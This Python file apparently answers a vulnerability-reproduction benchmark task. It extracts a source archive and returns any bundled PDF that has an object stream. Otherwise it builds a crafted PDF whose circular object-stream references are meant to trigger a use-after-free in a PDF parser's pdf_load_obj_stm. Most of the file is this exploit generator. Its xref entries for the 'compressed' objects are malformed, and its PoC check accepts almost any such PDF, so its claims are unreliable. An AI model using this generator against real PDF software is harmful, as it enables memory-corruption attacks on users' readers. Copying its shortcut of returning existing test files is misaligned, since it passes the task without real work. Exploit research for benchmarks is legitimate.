import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # First try to find existing PoC in source tree
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for PDF test files that might be PoCs
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.pdf'):
                        full_path = os.path.join(root, file)
                        with open(full_path, 'rb') as f:
                            content = f.read()
                            if self.is_likely_poc(content):
                                return content
            
            # If no existing PoC found, generate our own
            return self.generate_poc()
    
    def is_likely_poc(self, data: bytes) -> bool:
        # Check if it looks like a valid PDF
        if not data.startswith(b'%PDF-'):
            return False
        if b'%%EOF' not in data[-1024:]:
            return False
        # Additional checks for object streams which are relevant to this bug
        if b'/ObjStm' not in data and b'/Type /ObjStm' not in data:
            return False
        return True
    
    def generate_poc(self) -> bytes:
        # Build a PDF designed to trigger use-after-free in pdf_load_obj_stm
        # This creates an object stream with circular references that cause
        # the xref entry to be freed during loading
        
        # Object definitions
        obj1 = b"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
"""

        obj2 = b"""2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
"""

        obj3 = b"""3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
/Contents 4 0 R
>>
endobj
"""

        obj4 = b"""4 0 obj
<<
/Length 25
>>
stream
BT /F1 12 Tf 72 720 Td (test) Tj ET
endstream
endobj
"""

        # Object stream containing objects 5 and 6
        # Object 5 references object 6, object 6 references object 5
        # This circular reference during loading triggers the bug
        obj5_data = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 6 0 R >>"
        obj6_data = b"<< /Type /FontDescriptor /FontName /Helvetica /FontFile 5 0 R >>"
        
        # Object stream index and data
        obj_stream_index = b"5 0 6 50 "
        obj_stream_data = obj_stream_index + obj5_data + b" " + obj6_data
        
        obj7 = b"""7 0 obj
<<
/Type /ObjStm
/N 2
/First %d
/Length %d
>>
stream
%s
endstream
endobj
""" % (len(obj_stream_index), len(obj_stream_data), obj_stream_data)

        # Calculate offsets
        parts = []
        parts.append(b"%PDF-1.4\n")
        
        # Object 1
        offset1 = len(b"".join(parts))
        parts.append(obj1)
        
        # Object 2
        offset2 = len(b"".join(parts))
        parts.append(obj2)
        
        # Object 3
        offset3 = len(b"".join(parts))
        parts.append(obj3)
        
        # Object 4
        offset4 = len(b"".join(parts))
        parts.append(obj4)
        
        # Object 7 (object stream containing 5 and 6)
        offset7 = len(b"".join(parts))
        parts.append(obj7)
        
        # Build xref table
        xref_start = len(b"".join(parts))
        xref = [b"xref", b"0 8", b"0000000000 65535 f "]
        
        # Object 0 (free)
        # Object 1
        xref.append(f"{offset1:010d} 00000 n ".encode())
        # Object 2
        xref.append(f"{offset2:010d} 00000 n ".encode())
        # Object 3
        xref.append(f"{offset3:010d} 00000 n ".encode())
        # Object 4
        xref.append(f"{offset4:010d} 00000 n ".encode())
        # Object 5 (compressed, points to object stream)
        xref.append(f"{offset7:010d} 00000 n ".encode())
        # Object 6 (compressed, points to object stream)
        xref.append(f"{offset7:010d} 00000 n ".encode())
        # Object 7
        xref.append(f"{offset7:010d} 00000 n ".encode())
        
        parts.append(b"\n".join(xref))
        
        # Trailer
        parts.append(b"""
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
""")
        parts.append(f"{xref_start}\n".encode())
        parts.append(b"%%EOF")
        
        return b"".join(parts)